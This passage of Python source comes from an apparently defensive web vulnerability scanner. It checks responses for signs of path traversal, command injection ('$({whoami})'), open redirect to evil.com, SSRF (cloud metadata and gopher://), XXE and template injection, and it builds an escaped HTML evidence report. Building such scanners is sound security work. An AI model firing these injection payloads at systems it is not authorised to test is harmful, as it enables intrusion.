        if "../" in payload or "..\\" in payload:
            for label, pat in PATH_TRAVERSAL_PATTERNS:
                if pat.search(combined):
                    patterns_matched.append(f"PathTraversal:{label}")
                    self.logger.log(
                        "active_match",
                        f"test_id={test_id} kind=PathTraversal pattern={label} "
                        f"url={inp.url} input={inp.name}",
                        payload=payload,
                    )
        # Command Injection checks (only if the payload contains ; | or $().
        if ";" in payload or "|" in payload or "$(" in payload:
            for label, pat in CMD_INJECTION_PATTERNS:
                if pat.search(combined):
                    # Skip the cmd_substitution_not_reflected pattern if the
                    # payload IS reflected literally (meaning the shell did
                    # NOT execute it — that's a NEGATIVE result).
                    if label == "cmd_substitution_not_reflected":
                        if "$({whoami})" in combined or "$({whoami})".lower() in combined.lower():
                            continue  # payload was reflected literally → not executed
                    patterns_matched.append(f"CMDi:{label}")
                    self.logger.log(
                        "active_match",
                        f"test_id={test_id} kind=CMDi pattern={label} "
                        f"url={inp.url} input={inp.name}",
                        payload=payload,
                    )
            # Echo-canary: reliable cross-platform CMDi signal (catches
            # embedded/Windows output the whoami regexes miss).
            if _cmdi_echo_canary_hit(payload, combined):
                patterns_matched.append("CMDi:echo_canary")
                self.logger.log(
                    "active_match",
                    f"test_id={test_id} kind=CMDi pattern=echo_canary "
                    f"url={inp.url} input={inp.name}",
                    payload=payload,
                )
        # Open Redirect checks (only if the payload is a URL).
        if "evil.com" in payload:
            # IMPORTANT: only check the response HEADERS (specifically the
            # Location header) for a redirect to evil.com. We deliberately
            # do NOT check the response body — many search-results pages
            # echo the query string (e.g. "You searched for evil.com"),
            # which would falsely trigger an Open Redirect finding.
            response_headers_str = str(last_response.get("headers", {})).lower()
            # Also require the response status to be a 3xx redirect, since
            # some apps set Location headers on 200 responses for navigation
            # purposes (not real redirects).
            response_status_for_redirect = last_response.get("status", 200)
            is_redirect_status = response_status_for_redirect in (301, 302, 303, 307, 308)
            if is_redirect_status and OPEN_REDIRECT_INDICATOR.search(response_headers_str):
                patterns_matched.append("OpenRedirect:location_header")
                self.logger.log(
                    "active_match",
                    f"test_id={test_id} kind=OpenRedirect "
                    f"url={inp.url} input={inp.name}",
                    payload=payload,
                )
        # SSRF checks (only if the payload is a URL / internal fetch target).
        # Detection is reflection/metadata-based: cloud-metadata content or
        # internal-fetch errors leaked back. Blind SSRF (silent fetch) is NOT
        # caught by this — it needs an out-of-band listener (future option).
        _payload_lower_ssrf = payload.lower()
        if (payload.startswith(("http://", "https://", "file://", "dict://", "gopher://"))
                or "169.254" in payload or payload.startswith("//")):
            for label, pat in SSRF_PATTERNS:
                if pat.search(combined):
                    patterns_matched.append(f"SSRF:{label}")
                    self.logger.log(
                        "active_match",
                        f"test_id={test_id} kind=SSRF pattern={label} "
                        f"url={inp.url} input={inp.name}",
                        payload=payload,
                    )
        # XXE checks (only if the payload is an XML document).
        if _payload_stripped.startswith("<?xml") or "<!DOCTYPE" in payload or "<!ENTITY" in payload:
            for label, pat in XXE_PATTERNS:
                if pat.search(combined):
                    patterns_matched.append(f"XXE:{label}")
                    self.logger.log(
                        "active_match",
                        f"test_id={test_id} kind=XXE pattern={label} "
                        f"url={inp.url} input={inp.name}",
                        payload=payload,
                    )
        # CSS injection: is the payload reflected into a CSS-executable
        # context (<style> block or style= attribute)? Reflected input there
        # lets an attacker inject CSS to exfiltrate data / deceive the UI.
        css_ctx = css_injection_context(payload, combined)
        if css_ctx:
            patterns_matched.append(f"CSSInjection:{css_ctx}")
            self.logger.log(
                "active_match",
                f"test_id={test_id} kind=CSSInjection context={css_ctx} "
                f"url={inp.url} input={inp.name}",
                payload=payload,
            )
        # SSTI checks (only if the payload contains template syntax).
        if "{{" in payload or "${" in payload or "#{" in payload or "<%=" in payload:
            # Check if the payload was EVALUATED by the template engine.
            # The signal: the literal payload (e.g. {{7*7}}) is GONE from
            # the response, but the computed result (49) IS present. This
            # is much more reliable than the old check which fired on any
            # response containing "49" (matched page counts, prices,
            # dates, IDs, etc.).
            payload_patterns_to_check = []
            if "{{" in payload:
                payload_patterns_to_check.append(("{{", "}}"))
            if "${" in payload:
                payload_patterns_to_check.append(("${", "}"))
            if "#{" in payload:
                payload_patterns_to_check.append(("#{", "}"))
            if "<%=" in payload:
                payload_patterns_to_check.append(("<%=", "%>"))
            # For each template-syntax payload, check:
            #   (a) the literal payload is NOT in the response (was consumed)
            #   (b) the computed result 49 IS in the response (was evaluated)
            ssti_evaluated = False
            for open_tok, close_tok in payload_patterns_to_check:
                # Build the literal payload signature, e.g. {{7*7}}
                literal = f"{open_tok}7*7{close_tok}"
                if literal not in combined and "49" in combined and "49" not in payload:
                    ssti_evaluated = True
                    break
            if ssti_evaluated:
                patterns_matched.append("SSTI:evaluated_49")
                self.logger.log(
                    "active_match",
                    f"test_id={test_id} kind=SSTI "
                    f"url={inp.url} input={inp.name}",
                    payload=payload,
                )

        # --- Persist the raw request/response ALWAYS ----------------------
        # Even if no pattern matched, we save the raw traffic. The engineer
        # may want to audit negative tests (e.g. to confirm a payload was
        # actually sent and not silently dropped).
        raw_evidence = self._format_raw_evidence(
            inp, payload, last_request, last_response, rendered_html,
        )
        try:
            ev_file.write_text(raw_evidence, encoding="utf-8")
        except Exception as e:
            self.logger.log("active_inject",
                            f"failed to write evidence {ev_file.name}: {e}")

        # --- Build a Finding if anything matched --------------------------
        if not patterns_matched:
            # Debug: log WHY no patterns matched (helpful for troubleshooting
            # missing SQLi/XSS findings)
            if self.debug_mode:
                resp_status_dbg = last_response.get("status", "?")
                resp_len_dbg = len(body)
                # Check what the response actually contained
                has_sql_error = "sql" in combined.lower() or "mysql" in combined.lower() or "syntax" in combined.lower()
                has_success_kw = any(kw in combined.lower() for kw in ["welcome", "logout", "dashboard", "logged in"])
                has_failure_kw = any(kw in combined.lower() for kw in ["invalid", "incorrect", "wrong", "failed"])
                self.logger.log(
                    "debug_no_match",
                    f"test_id={test_id} input={inp.name} payload={payload[:60]!r}\n"
                    f"  status={resp_status_dbg} body_len={resp_len_dbg}\n"
                    f"  has_sql_error={has_sql_error} has_success_kw={has_success_kw} "
                    f"has_failure_kw={has_failure_kw}\n"
                    f"  body_preview: {body[:200].replace(chr(10), '\\\\n')}",
                )
            return None

        # Determine severity + OWASP category.
        is_xss = any(p.startswith("XSS:") for p in patterns_matched)
        is_sqli = any(p.startswith("SQLi:") for p in patterns_matched)
        is_traversal = any(p.startswith("PathTraversal:") for p in patterns_matched)
        is_cmdi = any(p.startswith("CMDi:") for p in patterns_matched)
        is_redirect = any(p.startswith("OpenRedirect:") for p in patterns_matched)
        is_ssti = any(p.startswith("SSTI:") for p in patterns_matched)
        is_ssrf = any(p.startswith("SSRF:") for p in patterns_matched)
        is_xxe = any(p.startswith("XXE:") for p in patterns_matched)
        is_css_inj = any(p.startswith("CSSInjection:") for p in patterns_matched)
        if is_sqli:
            severity = "High"
            owasp = "A05:2025 Injection"
            # Build a more specific title based on the SQLi type
            sqli_types = [p for p in patterns_matched if p.startswith("SQLi:")]
            if any("auth_bypass" in p for p in sqli_types):
                title = f"Potential SQL Injection AUTH BYPASS via '{inp.name}' in {inp.url}"
            elif any("union" in p for p in sqli_types):
                title = f"Potential SQL Injection UNION-based via '{inp.name}' in {inp.url}"
            elif any("time_based" in p for p in sqli_types):
                title = f"Potential SQL Injection TIME-based via '{inp.name}' in {inp.url}"
            elif any("potential_bypass" in p for p in sqli_types):
                title = f"Potential SQL Injection (possible auth bypass) via '{inp.name}' in {inp.url}"
            else:
                title = f"Potential SQL Injection (error-based) via '{inp.name}' in {inp.url}"
        elif is_xss:
            severity = "High"
            owasp = "A05:2025 Injection"
            title = f"Potential XSS Reflection via '{inp.name}' in {inp.url}"
        elif is_traversal:
            severity = "High"
            owasp = "A01:2025 Broken Access Control"
            title = f"Potential Path Traversal via '{inp.name}' in {inp.url}"
        elif is_cmdi:
            severity = "High"
            owasp = "A05:2025 Injection"
            title = f"Potential Command Injection via '{inp.name}' in {inp.url}"
        elif is_ssti:
            severity = "High"
            owasp = "A05:2025 Injection"
            title = f"Potential SSTI via '{inp.name}' in {inp.url}"
        elif is_ssrf:
            # SSRF: server fetched our injected URL. Reflection/metadata only
            # (blind SSRF without a listener isn't detected).
            severity = "High"
            owasp = "A05:2025 Injection"
            title = f"Potential SSRF via '{inp.name}' in {inp.url}"
        elif is_xxe:
            severity = "High"
            owasp = "A05:2025 Injection"
            title = f"Potential XXE via '{inp.name}' in {inp.url}"
        elif is_css_inj:
            # CSS injection: input reflected into <style>/style= — attacker
            # can inject CSS to exfiltrate data / deceive UI. Medium (data
            # exfil, not direct code exec).
            severity = "Medium"
            owasp = "A05:2025 Injection"
            title = f"Potential CSS Injection via '{inp.name}' in {inp.url}"
        elif is_redirect:
            severity = "Medium"
            owasp = "A01:2025 Broken Access Control"
            title = f"Potential Open Redirect via '{inp.name}' in {inp.url}"
        else:
            severity = "Medium"
            owasp = "A05:2025 Injection"
            title = f"Potential Injection via '{inp.name}' in {inp.url}"

        # Take a screenshot at the moment of detection. For XSS this may
        # capture an alert() dialog if the payload executed; for SQLi it
        # captures the error page.
        screenshot_path: Optional[str] = None
        try:
            ss_path = self.evidence_dir / f"{timestamp}_{test_id}_screenshot.png"
            await _pw(page.screenshot, path=str(ss_path), full_page=True, default=None)
            screenshot_path = str(ss_path)
            trail.append(f"[Step 4] Screenshot captured: {ss_path.name}")
        except Exception as e:
            self.logger.log("active_inject",
                            f"screenshot failed: {e}")

        if patterns_matched:
            trail.append(
                f"[Step 5] Patterns matched: {', '.join(patterns_matched)}"
            )
            trail.append("[Step 6] Finding recorded as UNVERIFIED — "
                         "engineer must manually confirm.")

        finding = Finding(
            finding_id=test_id,
            owasp_category=owasp,
            title=title,
            severity=severity,
            url=inp.url,
            payload=payload,
            request_raw=self._format_request_text(inp, payload, last_request),
            response_raw=self._format_response_text(last_response),
            execution_trail=trail,
            screenshot_path=screenshot_path,
            patterns_matched=patterns_matched,
            unverified=True,  # ALWAYS True — we never auto-confirm
        )

        # Update the global state so the emergency-stop handler can render
        # a partial report if the user hits Ctrl+C mid-scan.
        GLOBAL_STATE.partial_findings.append(finding)

        # Write findings.json INCREMENTALLY after each finding.
        # This ensures the web UI's OWASP tab + findings API can serve
        # findings even while the scan is still running (or if it's
        # interrupted before the final findings.json write at Step 10.1).
        try:
            findings_data = []
            for f in _dedupe_findings_by_id(GLOBAL_STATE.partial_findings):
                d = asdict(f)
                if d.get("screenshot_path"):
                    d["screenshot_path"] = os.path.basename(d["screenshot_path"])
                    d["has_screenshot"] = True
                else:
                    d["has_screenshot"] = False
                findings_data.append(d)
            findings_json_path = self.evidence_dir.parent / "findings.json"
            findings_json_path.write_text(
                json.dumps(findings_data, indent=2, ensure_ascii=False,
                           default=str),
                encoding="utf-8",
            )
        except Exception:
            pass  # don't let evidence-file writes interrupt the scan

        # Log a summary of the test result so the engineer can see what
        # happened at a glance in the trail.
        resp_status = last_response.get("status", "?")
        resp_len = len(body)
        resp_url = last_response.get("url", "?")
        self.logger.log(
            "active_result",
            f"test_id={test_id} input={inp.name} "
            f"status={resp_status} body_len={resp_len} "
            f"matched={','.join(patterns_matched) if patterns_matched else 'none'} "
            f"finding={'YES' if patterns_matched else 'no'}",
        )

        # --- DEBUG MODE: Log extensive details for troubleshooting ---
        if self.debug_mode:
            # Response headers (truncated)
            resp_headers = last_response.get("headers", {}) or {}
            headers_str = json.dumps(resp_headers, ensure_ascii=False)[:500]
            # Response body preview (first 500 chars)
            body_preview = body[:500].replace("\n", "\\n")
            # Rendered DOM preview
            dom_preview = rendered_html[:300].replace("\n", "\\n")
            # Request details
            req_method = last_request.get("method", "?")
            req_url = last_request.get("url", "?")
            req_post = str(last_request.get("post_data", ""))[:200]
            self.logger.log(
                "debug_test_detail",
                f"test_id={test_id}\n"
                f"  INPUT: name={inp.name} location={inp.location} url={inp.url}\n"
                f"  PAYLOAD: {payload[:200]!r}\n"
                f"  REQUEST: {req_method} {req_url}\n"
                f"  POST_DATA: {req_post}\n"
                f"  RESPONSE: status={resp_status} url={resp_url} body_len={resp_len}\n"
                f"  RESP_HEADERS: {headers_str}\n"
                f"  BODY_PREVIEW: {body_preview}\n"
                f"  DOM_PREVIEW: {dom_preview}\n"
                f"  PATTERNS_CHECKED: "
                f"XSS={'yes' if '<' in payload or 'javascript:' in payload.lower() else 'no'} "
                f"SQLi={'yes' if chr(39) in payload or '--' in payload else 'no'} "
                f"Path={'yes' if '../' in payload else 'no'} "
                f"CMDi={'yes' if ';' in payload or '|' in payload else 'no'} "
                f"SSTI={'yes' if '{{' in payload or '${' in payload else 'no'}\n"
                f"  PATTERNS_MATCHED: {','.join(patterns_matched) if patterns_matched else 'none'}\n"
                f"  FINDING: {'YES — ' + title if patterns_matched else 'no'}",
            )

        return finding

    # --- Helpers for evidence formatting ----------------------------------

    def _format_raw_evidence(
        self,
        inp: InputField,
        payload: str,
        last_request: Dict[str, Any],
        last_response: Dict[str, Any],
        rendered_html: str,
    ) -> str:
        """Format a full raw-evidence .txt file for one injection test."""
        lines = [
            f"# Evidence file generated by ScriptKiddie-Recon",
            f"# Generated: {datetime.now(timezone.utc).isoformat()}",
            f"# Target URL: {inp.url}",
            f"# Input name: {inp.name}",
            f"# Input location: {inp.location}",
            f"# Input method: {inp.method}",
            f"# Payload: {payload!r}",
            "",
            "=== RAW REQUEST ===",
            f"{last_request.get('method', 'GET')} {last_request.get('url', inp.url)}",
        ]
        for k, v in (last_request.get("headers") or {}).items():
            lines.append(f"{k}: {v}")
        if last_request.get("post_data"):
            lines.append("")
            lines.append(last_request["post_data"])
        lines.append("")
        lines.append("=== RAW RESPONSE (HTTP) ===")
        lines.append(f"Status: {last_response.get('status', '?')}")
        for k, v in (last_response.get("headers") or {}).items():
            lines.append(f"{k}: {v}")
        lines.append("")
        # Truncate very large response bodies in the evidence file. The
        # full body is preserved in the JSON trail if needed.
        body = last_response.get("body", "") or ""
        if len(body) > 50000:
            body = body[:50000] + "\n...[truncated for readability]..."
        lines.append(body)
        lines.append("")
        lines.append("=== RENDERED DOM (post-injection) ===")
        if len(rendered_html) > 50000:
            rendered_html = rendered_html[:50000] + "\n...[truncated]..."
        lines.append(rendered_html)
        return "\n".join(lines)

    def _format_request_text(
        self, inp: InputField, payload: str, last_request: Dict[str, Any]
    ) -> str:
        """Compact request representation for the HTML report's finding view."""
        lines = [
            f"{last_request.get('method', inp.method)} {last_request.get('url', inp.url)}",
        ]
        for k, v in (last_request.get("headers") or {}).items():
            lines.append(f"{k}: {v}")
        if last_request.get("post_data"):
            lines.append("")
            lines.append(last_request["post_data"])
        return "\n".join(lines)

    def _format_response_text(self, last_response: Dict[str, Any]) -> str:
        """Compact response representation for the HTML report's finding view."""
        lines = [f"Status: {last_response.get('status', '?')}"]
        for k, v in (last_response.get("headers") or {}).items():
            lines.append(f"{k}: {v}")
        body = last_response.get("body", "") or ""
        if len(body) > 20000:
            body = body[:20000] + "\n...[truncated]..."
        lines.append("")
        lines.append(body)
        return "\n".join(lines)


# ============================================================================
# SECTION 14 — EVIDENCE ENGINE (Screenshots, Raw Traffic, Trail)
# ============================================================================
#
# The Evidence Engine centralises the "show your work" requirements:
#   - Full-page screenshot of the target BEFORE active fuzzing starts.
#   - Full-page screenshot of the target AFTER active fuzzing completes.
#   - Per-finding screenshots (taken at the moment of detection — handled
#     inside the OWASP scanner, but the file naming convention lives here).
#   - Raw HTTP traffic .txt files (handled inside the OWASP scanner, but
#     we provide a helper to enumerate them for the report).
#   - Structured execution_trail.json (handled by ExecutionTrailLogger,
#     but we provide read helpers here for the report generator).
#
# WHY A DEDICATED CLASS: Keeping evidence operations in one place makes
# it easy to add new evidence types (e.g. HAR export, video recording)
# without touching the scanner logic.

class EvidenceEngine:
    """Manages screenshots, raw traffic files, and the execution trail."""

    def __init__(
        self,
        evidence_dir: Path,
        logger: ExecutionTrailLogger,
    ) -> None:
        self.evidence_dir = evidence_dir
        self.evidence_dir.mkdir(parents=True, exist_ok=True)
        self.logger = logger
        # We stash the before/after screenshot paths so the HTML report
        # can embed them as base64.
        self.before_screenshot: Optional[Path] = None
        self.after_screenshot: Optional[Path] = None

    async def capture_before(self, page: Page, label: str = "before") -> None:
        """Take the 'before' full-page screenshot for the Header Analysis tab."""
        path = self.evidence_dir / f"screenshot_{label}.png"
        try:
            await _pw(page.screenshot, path=str(path), full_page=True, default=None)
            self.before_screenshot = path
            self.logger.log("evidence_screenshot",
                            f"saved {label} screenshot to {path.name}")
        except Exception as e:
            self.logger.log("evidence_screenshot",
                            f"failed to capture {label} screenshot: {e}")

    async def capture_after(self, page: Page, label: str = "after") -> None:
        """Take the 'after' full-page screenshot, post-fuzzing."""
        path = self.evidence_dir / f"screenshot_{label}.png"
        try:
            await _pw(page.screenshot, path=str(path), full_page=True, default=None)
            self.after_screenshot = path
            self.logger.log("evidence_screenshot",
                            f"saved {label} screenshot to {path.name}")
        except Exception as e:
            self.logger.log("evidence_screenshot",
                            f"failed to capture {label} screenshot: {e}")

    def list_raw_evidence(self) -> List[Dict[str, Any]]:
        """Enumerate all .txt evidence files in the evidence directory.

        The HTML report's "Raw Evidence Vault" tab uses this to build a
        clickable file browser. We return relative paths and sizes so the
        engineer can quickly find specific tests.
        """
        files = []
        for p in sorted(self.evidence_dir.glob("*.txt")):
            files.append({
                "name": p.name,
                "path": str(p.relative_to(self.evidence_dir.parent)),
                "size_bytes": p.stat().st_size,
                "modified": datetime.fromtimestamp(
                    p.stat().st_mtime, tz=timezone.utc
                ).isoformat(),
            })
        return files

    @staticmethod
    def encode_image_base64(path: Path) -> str:
        """Read an image file and return its base64-encoded content.

        Used by the HTML report to embed screenshots inline so the
        report is fully self-contained (no external image dependencies).
        We use base64 because data: URIs are universally supported and
        require no external resources — critical for airgapped viewing.
        """
        try:
            data = path.read_bytes()
            # We detect format from the extension. PNG and JPEG are the
            # only formats Playwright produces.
            suffix = path.suffix.lower()
            mime = {
                ".png": "image/png",
                ".jpg": "image/jpeg",
                ".jpeg": "image/jpeg",
            }.get(suffix, "image/png")
            return f"data:{mime};base64,{base64.b64encode(data).decode('ascii')}"
        except Exception:
            return ""

    def read_trail(self) -> List[Dict[str, Any]]:
        """Read the execution_trail.jsonl file and return parsed entries.

        The trail is JSON Lines (one JSON object per line). We parse each
        line independently so a truncated final line doesn't invalidate
        the rest of the trail.
        """
        trail_path = self.evidence_dir.parent / "execution_trail.jsonl"
        if not trail_path.exists():
            # Backwards-compat: also check the older .json name.
            trail_path = self.evidence_dir.parent / "execution_trail.json"
            if not trail_path.exists():
                return []
        entries = []
        with open(trail_path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    entries.append(json.loads(line))
                except json.JSONDecodeError:
                    # Skip malformed lines (e.g. truncated on crash).
                    continue
        return entries


# ============================================================================
# SECTION 15 — HTML REPORT GENERATOR (Self-contained, tabbed)
# ============================================================================
#
# The report is a SINGLE .html file with:
#   - All CSS inlined in a <style> tag (no external stylesheets).
#   - All JS inlined in a <script> tag (no external scripts, no CDN).
#   - All screenshots embedded as base64 <img src="data:...">.
#   - All findings data embedded as a JSON <script type="application/json">
#     block, parsed by the inline JS at page load.
#
# WHY SELF-CONTAINED: The deliverable must be viewable in an airgapped
# environment. Any external dependency (CDN, font, image) would either
# fail to load or leak information about the scan to the CDN operator.
# A single .html file is also easy to email, archive, and sign.
#
# TAB STRUCTURE:
#   1. Executive Summary — stats, scope, risk matrix, AI disclaimer.
#   2. Header Analysis — Table A (cross-referenced) + Table B (anomalies)
#      + before-screenshot.
#   3. Attack Surface — discovered URLs + inputs.
#   4. SSL/TLS & Crypto — cert details + cipher review.
#   5. OWASP Top 10 (2025) — nested sub-tabs per finding.
#   6. Raw Evidence Vault — file browser of .txt evidence files.
#
# The HTML is generated via Python string concatenation. We deliberately
# avoid Jinja2 or other templating engines to keep the dependency surface
# to stdlib + playwright + dotenv only. The trade-off is that the
# generator code is verbose and string-heavy; we mitigate this by keeping
# each section's HTML in its own method.

# --- OWASP 2025 category labels (for the OWASP tab primary navigation) -----
# These are the official OWASP Top 10 2025 category titles. We map each
# finding to one of these via the Finding.owasp_category field.
OWASP_2025_CATEGORIES: List[str] = [
    "A01:2025 Broken Access Control",
    "A02:2025 Security Misconfiguration",
    "A03:2025 Software Supply Chain Failures",
    "A04:2025 Cryptographic Failures",
    "A05:2025 Injection",
    "A06:2025 Insecure Design",
    "A07:2025 Authentication Failures",
    "A08:2025 Software or Data Integrity Failures",
    "A09:2025 Security Logging and Alerting Failures",
    "A10:2025 Mishandling of Exceptional Conditions",
]


def _esc(text: Any) -> str:
    """HTML-escape a value for safe embedding in the report.

    We use a minimal escape (no full entity table) because the report is
    viewed locally and the engineer is the only audience. We DO escape
    the dangerous five (&, <, >, ", ') to prevent the report itself from
    being XSS-vulnerable when it contains reflected payload strings.
    """
    if text is None:
        return ""
    s = str(text)
    # Order matters: replace & first so we don't double-escape.
    s = s.replace("&", "&amp;")
    s = s.replace("<", "&lt;")
    s = s.replace(">", "&gt;")
    s = s.replace('"', "&quot;")
    s = s.replace("'", "&#39;")
    return s


class HTMLReportGenerator:
    """Builds the self-contained tabbed HTML report.

    The generator is initialised with all the data produced by the scan
    and emits a single .html file. The data is also embedded as JSON
    inside the file so the inline JS can render interactive elements
    (collapsible request/response blocks, sub-tab navigation).
    """

    def __init__(
        self,
        target_url: str,
        scan_started_at: datetime,
        scan_ended_at: datetime,
        interrupted: bool,
        scope_config: Dict[str, Any],
        header_records: List[HeaderRecord],
        crawl_map: List[CrawledURL],
        attack_surface: List[InputField],
        ssl_record: SSLRecord,
        passive: PassiveFindings,
        findings: List[Finding],
        evidence_files: List[Dict[str, Any]],
        before_screenshot: Optional[Path],
        after_screenshot: Optional[Path],
        executive_summary: str,
        logger: ExecutionTrailLogger,
        ai_analysis: Optional[Dict[str, Any]] = None,
    ) -> None:
        # Stash all inputs. The generator is a pure function of these.
        self.target_url = target_url
        self.scan_started_at = scan_started_at
        self.scan_ended_at = scan_ended_at
        self.interrupted = interrupted
        self.scope_config = scope_config
        self.header_records = header_records
        self.crawl_map = crawl_map
        self.attack_surface = attack_surface
        self.ssl_record = ssl_record
        self.passive = passive
        self.findings = findings
        self.evidence_files = evidence_files
        self.before_screenshot = before_screenshot
        self.after_screenshot = after_screenshot
        self.executive_summary = executive_summary
        self.logger = logger
        # --- AI analysis lookup for per-finding annotations ---
        # Build a map from finding_id → {confidence, reasoning, is_fp} from
        # the llm_analysis dict (owasp_classifications + false_positive_candidates).
        # Used by _render_finding_panel to show AI confidence/FP badges.
        self._ai_lookup: Dict[str, Dict[str, Any]] = {}
        self._fp_ids: set = set()
        if ai_analysis and isinstance(ai_analysis, dict):
            for cls in (ai_analysis.get("owasp_classifications") or []):
                if isinstance(cls, dict) and cls.get("finding_id"):
                    self._ai_lookup[cls["finding_id"]] = cls
            for fp in (ai_analysis.get("false_positive_candidates") or []):
                if isinstance(fp, dict) and fp.get("finding_id"):
                    self._fp_ids.add(fp["finding_id"])
        self.ai_analysis = ai_analysis

    def render(self, output_path: Path) -> Path:
        """Write the full HTML report to `output_path` and return it."""
        html = self._build_html()
        output_path.parent.mkdir(parents=True, exist_ok=True)
        output_path.write_text(html, encoding="utf-8")
        self.logger.log(
            "report_rendered",
            f"path={output_path.name} size={output_path.stat().st_size}B",
        )
        return output_path

    @staticmethod
    def _sanitize_json_for_html(json_str: str) -> str:
        """Escape JSON content for safe embedding inside <script> tags.

        Per the HTML spec, the content of a <script> element must not
        contain the literal string "</script>" (case-insensitive) — the
        browser will close the script element early and treat the rest
        as executable JavaScript. This is a well-known XSS vector.

        We also escape "<!--" (which can cause similar issues with the
        HTML parser's script-data double-escaped state).

        The fix: replace "</" with "<\\/" and "<!--" with "<\\!--".
        The JSON parser (JSON.parse in the browser's inline JS) treats
        \\/ as / (backslash before / is a no-op escape in JSON), so the
        data is preserved correctly while the HTML parser no longer sees
        a closing </script> tag.

        See: https://html.spec.whatwg.org/#restrictions-for-contents-of-script-elements
        """
        # Replace </script> with <\/script> (case-insensitive).
        # The \\/ is a valid JSON escape that the parser converts back to /.
        json_str = re.sub(
            r'</(script)',
            lambda m: '<\\\\/' + m.group(1),
            json_str,
            flags=re.IGNORECASE,
        )
        # Replace <!-- with <\!-- to prevent script-data state confusion.
        json_str = json_str.replace('<!--', '<\\!--')
        return json_str

    # =====================================================================
    # TOP-LEVEL HTML ASSEMBLY
    # =====================================================================

    def _build_html(self) -> str:
        """Assemble the full HTML document."""
        # Embed all findings data as JSON for the inline JS to consume.
        # We use ensure_ascii=False so non-ASCII payloads render correctly.
        # CRITICAL: We must escape </script> and <!-- sequences in the JSON
        # to prevent XSS execution inside the <script type="application/json">
        # blocks. If the JSON contains a raw </script>, the browser closes
        # the script tag early and the remaining content executes as JS.
        # This is a well-known XSS vector in JSONP/data blocks.
        # See: https://html.spec.whatwg.org/#restrictions-for-contents-of-script-elements
        findings_json = self._sanitize_json_for_html(
            json.dumps([asdict(f) for f in self.findings],
                       ensure_ascii=False, default=str)
        )
        # Embed evidence file list.
        evidence_json = self._sanitize_json_for_html(
            json.dumps(self.evidence_files, default=str)
        )
        # Embed attack surface.
        surface_json = self._sanitize_json_for_html(
            json.dumps([asdict(i) for i in self.attack_surface],
                       ensure_ascii=False, default=str)
        )
        # Embed crawl map.
        crawl_json = self._sanitize_json_for_html(
            json.dumps([asdict(c) for c in self.crawl_map],
                       ensure_ascii=False, default=str)
        )
        # Embed header records.
        headers_json = self._sanitize_json_for_html(
            json.dumps([asdict(h) for h in self.header_records],
                       ensure_ascii=False, default=str)
        )
        # Embed SSL record.
        ssl_json = self._sanitize_json_for_html(
            json.dumps(asdict(self.ssl_record), default=str)
        )
        # Embed passive findings.
        passive_json = self._sanitize_json_for_html(
            json.dumps(asdict(self.passive), default=str)
        )

        return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Web Security Assessment Report — {_esc(self.target_url)}</title>
<style>
{self._css()}
</style>
</head>
<body>
{self._interrupted_banner()}
{self._header()}
{self._tab_nav()}
<main>
{self._tab_executive_summary()}
{self._tab_header_analysis()}
{self._tab_attack_surface()}
{self._tab_ssl()}
{self._tab_owasp()}
{self._tab_evidence_vault()}
</main>
<footer>
<p>Generated by ScriptKiddie-Recon on
   {_esc(self.scan_ended_at.strftime('%Y-%m-%d %H:%M:%S UTC'))}.
   All findings are UNVERIFIED and require manual confirmation by a
   qualified security engineer before any remediation is undertaken.</p>
</footer>
<script type="application/json" id="findings-data">
{findings_json}
</script>
<script type="application/json" id="evidence-data">
{evidence_json}
</script>
<script type="application/json" id="surface-data">
{surface_json}
</script>
<script type="application/json" id="crawl-data">
{crawl_json}
</script>
<script type="application/json" id="headers-data">
{headers_json}
</script>
<script type="application/json" id="ssl-data">
{ssl_json}
</script>
<script type="application/json" id="passive-data">
{passive_json}
</script>
<script>
{self._javascript()}
</script>
</body>
</html>"""

    # =====================================================================
    # CSS (inlined, no external dependencies)
    # =====================================================================

    def _css(self) -> str:
        """Return the report's CSS.

        Design notes:
          - We use a high-contrast dark-on-light palette for readability
            and print-friendliness. The report is intended to be viewed
            on screen AND printed as a PDF if needed.
          - Severity colours follow common convention: red=High,
            orange=Medium, yellow=Low, grey=Info.
          - The tab navigation uses CSS-only :target switching where
            possible, with a small JS fallback for older browsers.
        """
        return """
:root {
  --bg: #f5f5f5;
  --fg: #1a1a1a;
  --accent: #0066cc;
  --high: #c62828;
  --medium: #ef6c00;
  --low: #f9a825;
  --info: #607d8b;
  --border: #d0d0d0;
  --code-bg: #fafafa;
  --banner-bg: #ffebee;
  --banner-fg: #b71c1c;
}
* { box-sizing: border-box; }
body {
  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
  margin: 0;
  padding: 0;
  background: var(--bg);
  color: var(--fg);
  line-height: 1.5;
  font-size: 14px;
}
header.report-header {
  background: #1a1a1a;
  color: #fff;
  padding: 16px 24px;
}
header.report-header h1 { margin: 0 0 4px 0; font-size: 20px; }
header.report-header .meta { font-size: 12px; opacity: 0.85; }
.interrupted-banner {
  background: var(--banner-bg);
  color: var(--banner-fg);
  padding: 12px 24px;
  font-weight: bold;
  border-bottom: 2px solid var(--banner-fg);
}
.interrupted-banner.hidden { display: none; }
nav.tab-nav {
  background: #fff;
  border-bottom: 1px solid var(--border);
  padding: 0 24px;
  display: flex;
  flex-wrap: wrap;
  position: sticky;
  top: 0;
  z-index: 10;
}
nav.tab-nav button {
  background: none;
  border: none;
  border-bottom: 3px solid transparent;
  padding: 12px 16px;
  font-size: 14px;
  cursor: pointer;
  color: var(--fg);
}
nav.tab-nav button:hover { background: var(--bg); }
nav.tab-nav button.active {
  border-bottom-color: var(--accent);
  color: var(--accent);
  font-weight: 600;
}
main { padding: 24px; max-width: 1400px; margin: 0 auto; }
.tab-panel { display: none; }
.tab-panel.active { display: block; }
h2 { margin-top: 0; border-bottom: 2px solid var(--border); padding-bottom: 8px; }
h3 { margin-top: 24px; }
table {
  width: 100%;
  border-collapse: collapse;
  margin: 12px 0;
  background: #fff;
  border: 1px solid var(--border);
}
th, td {
  text-align: left;
  padding: 8px 12px;
  border-bottom: 1px solid var(--border);
  vertical-align: top;
  word-break: break-word;
}
th { background: #f0f0f0; font-weight: 600; }
tr:hover td { background: #fafafa; }
.severity-high { color: var(--high); font-weight: 700; }
.severity-medium { color: var(--medium); font-weight: 700; }
.severity-low { color: var(--low); font-weight: 700; }
.severity-info { color: var(--info); font-weight: 700; }
.badge {
  display: inline-block;
  padding: 2px 8px;
  border-radius: 3px;
  font-size: 11px;
  font-weight: 600;
  text-transform: uppercase;
}
